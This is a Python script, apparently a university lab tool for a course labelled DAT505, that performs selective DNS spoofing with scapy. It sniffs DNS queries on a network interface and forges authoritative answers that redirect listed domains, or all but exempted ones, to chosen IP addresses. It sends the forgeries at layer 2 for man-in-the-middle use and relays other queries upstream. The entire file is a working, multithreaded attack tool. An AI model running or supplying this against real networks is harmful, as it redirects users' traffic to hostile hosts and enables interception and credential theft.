#!/usr/bin/env python3
"""
DNS Spoof — DAT505 Lab Tool
High-performance selective DNS spoofing with thread pool for handling load.
Supports whitelist (only spoof listed domains) and blacklist (spoof all except listed).
"""
import os
import sys
import argparse
import signal
import socket
from concurrent.futures import ThreadPoolExecutor
from scapy.all import sniff, send, sendp, IP, UDP, DNS, DNSQR, DNSRR, Ether

# Global state
stop_sniffing = False
executor = None
sniff_iface = None

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully."""
    global stop_sniffing, executor
    print("\n[!] Stopping DNS spoofing...")
    stop_sniffing = True
    if executor:
        print("[*] Waiting for workers to finish...")
        executor.shutdown(wait=True, cancel_futures=True)
    sys.exit(0)

def is_root():
    """Check if running as root (required for packet crafting)."""
    return os.geteuid() == 0

def load_targets(path, mode):
    """
    Load target domain->IP mappings from a CSV-like file.
    Whitelist mode: domain,ip per line (exact mappings).
    Blacklist mode: domain per line (exemptions, no IP needed).
    """
    targets = {}
    with open(path, "r") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = [p.strip() for p in line.split(",")]
            domain = parts[0].lower().rstrip(".")
            
            if mode == "whitelist":
                if len(parts) >= 2:
                    ip = parts[1]
                    targets[domain] = ip
                else:
                    print(f"[!] Skipping invalid whitelist entry (no IP): {line}")
            else:  # blacklist
                targets[domain] = None  # mark as exempt
    return targets

def send_dns_reply(resp, pkt, iface, verbose):
    """Send DNS reply at L2 (preferred) or L3."""
    try:
        if pkt.haslayer(Ether):
            # Send at L2 for reliable delivery in MitM
            victim_mac = pkt[Ether].src
            frame = Ether(dst=victim_mac) / resp
            sendp(frame, iface=iface, verbose=0)
        else:
            # Fallback to L3
            send(resp, verbose=0)
    except Exception as e:
        if verbose:
            print(f"[!] Error sending reply: {e}")

def forward_query_nonblocking(dns_payload, upstream, timeout=0.8):
    """
    Forward DNS query to upstream using UDP socket (non-blocking).
    Returns DNS response bytes or None on timeout/error.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(bytes(dns_payload), (upstream, 53))
        data, _ = sock.recvfrom(4096)
        sock.close()
        return data
    except (socket.timeout, OSError):
        return None
    finally:
        try:
            sock.close()
        except:
            pass

def handle_pkt(pkt, targets, mode, default_ip, upstream, verbose):
    """
    Handle a single DNS query packet (runs in thread pool worker).
    Whitelist: spoof only if domain in targets (domain->ip).
    Blacklist: spoof all except domains in targets (exemptions); use default_ip.
    """
    # Ignore non-DNS-query packets
    if not (pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0):
        return

    try:
        qname = pkt[DNS].qd.qname.decode().rstrip('.').lower()
        src_ip = pkt[IP].src
        src_port = pkt[UDP].sport
        txid = pkt[DNS].id

        # --- Whitelist mode: only spoof exact matches ---
        if mode == "whitelist":
            if qname in targets:
                fake_ip = targets[qname]
                if verbose:
                    print(f"[+] Spoofing {qname} -> {fake_ip} for {src_ip}:{src_port}")
                
                resp = IP(dst=src_ip, src=pkt[IP].dst) / UDP(dport=src_port, sport=53) / DNS(
                    id=txid, qr=1, aa=1, ra=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=60, rdata=fake_ip)
                )
                send_dns_reply(resp, pkt, sniff_iface, verbose)
                return
            
            # Not a target: forward if upstream configured
            if upstream:
                if verbose:
                    print(f"[>] Forwarding {qname} to {upstream}")
                
                # Non-blocking forward
                response_data = forward_query_nonblocking(pkt[DNS], upstream, timeout=0.8)
                if response_data:
                    try:
                        answer = DNS(response_data)
                        relay = IP(dst=src_ip, src=pkt[IP].dst) / UDP(dport=src_port, sport=53) / answer
                        send_dns_reply(relay, pkt, sniff_iface, verbose)
                    except Exception as e:
                        if verbose:
                            print(f"[!] Error parsing upstream response for {qname}: {e}")
            return

        # --- Blacklist mode: spoof all except exemptions ---
        elif mode == "blacklist":
            if qname in targets:
                # Exempt: forward to upstream if configured
                if upstream:
                    if verbose:
                        print(f"[>] Exempt {qname}, forwarding to {upstream}")
                    
                    response_data = forward_query_nonblocking(pkt[DNS], upstream, timeout=0.8)
                    if response_data:
                        try:
                            answer = DNS(response_data)
                            relay = IP(dst=src_ip, src=pkt[IP].dst) / UDP(dport=src_port, sport=53) / answer
                            send_dns_reply(relay, pkt, sniff_iface, verbose)
                        except Exception as e:
                            if verbose:
                                print(f"[!] Error parsing upstream response for {qname}: {e}")
                return
            else:
                # Spoof to default_ip
                if not default_ip:
                    if verbose:
                        print(f"[!] Blacklist mode requires --default-ip for {qname}")
                    return
                
                if verbose:
                    print(f"[+] Spoofing {qname} -> {default_ip} for {src_ip}:{src_port}")
                
                resp = IP(dst=src_ip, src=pkt[IP].dst) / UDP(dport=src_port, sport=53) / DNS(
                    id=txid, qr=1, aa=1, ra=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=60, rdata=default_ip)
                )
                send_dns_reply(resp, pkt, sniff_iface, verbose)
                return
    except Exception as e:
        if verbose:
            print(f"[!] Error handling packet: {e}")

def main():
    global executor, sniff_iface
    
    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    if not is_root():
        print("[!] This script requires root privileges. Run with sudo.")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description="High-performance selective DNS spoofing for DAT505 lab."
    )
    parser.add_argument("-i", "--interface", required=True, help="Network interface to sniff on")
    parser.add_argument("-c", "--config", required=True, help="Config file: domain,ip (whitelist) or domain (blacklist)")
    parser.add_argument("-m", "--mode", choices=["whitelist", "blacklist"], default="whitelist",
                        help="Mode: whitelist (only spoof listed) or blacklist (spoof all except listed)")
    parser.add_argument("--default-ip", help="Default IP for blacklist mode (required in blacklist)")
    parser.add_argument("-u", "--upstream", help="Upstream DNS server for forwarding non-targeted queries")
    parser.add_argument("-v", "--verbose", action="store_true", help="Print spoofing/forwarding actions")
    parser.add_argument("-w", "--workers", type=int, default=4, help="Number of worker threads (default: 4)")
    args = parser.parse_args()

    # Validate blacklist mode requirements
    if args.mode == "blacklist" and not args.default_ip:
        print("[!] Blacklist mode requires --default-ip")
        sys.exit(1)

    # Load targets
    if not os.path.isfile(args.config):
        print(f"[!] Config file {args.config} not found.")
        sys.exit(1)
    targets = load_targets(args.config, args.mode)
    
    if args.mode == "whitelist":
        print(f"[*] Loaded {len(targets)} target mappings from {args.config} (whitelist mode)")
    else:
        print(f"[*] Loaded {len(targets)} exemptions from {args.config} (blacklist mode, default IP: {args.default_ip})")

    print(f"[*] Starting DNS spoof on interface {args.interface}")
    print(f"[*] Using {args.workers} worker threads")
    if args.upstream:
        print(f"[*] Forwarding non-targeted queries to {args.upstream}")
    print("[*] Press Ctrl+C to stop")

    # Store interface globally for workers
    sniff_iface = args.interface
    
    # Create thread pool
    executor = ThreadPoolExecutor(max_workers=args.workers)

    # Start sniffing DNS queries
    try:
        sniff(
            filter="udp and port 53",
            iface=args.interface,
            prn=lambda p: executor.submit(
                handle_pkt, 
                p.copy(),  # Copy packet to avoid threading issues
                targets, 
                args.mode, 
                args.default_ip, 
                args.upstream, 
                args.verbose
            ),
            store=False
        )
    except KeyboardInterrupt:
        pass  # Signal handler will clean up
    finally:
        if executor:
            print("\n[*] Shutting down workers...")
            executor.shutdown(wait=True, cancel_futures=True)
        print("[*] DNS spoofing stopped.")

if __name__ == "__main__":
    main()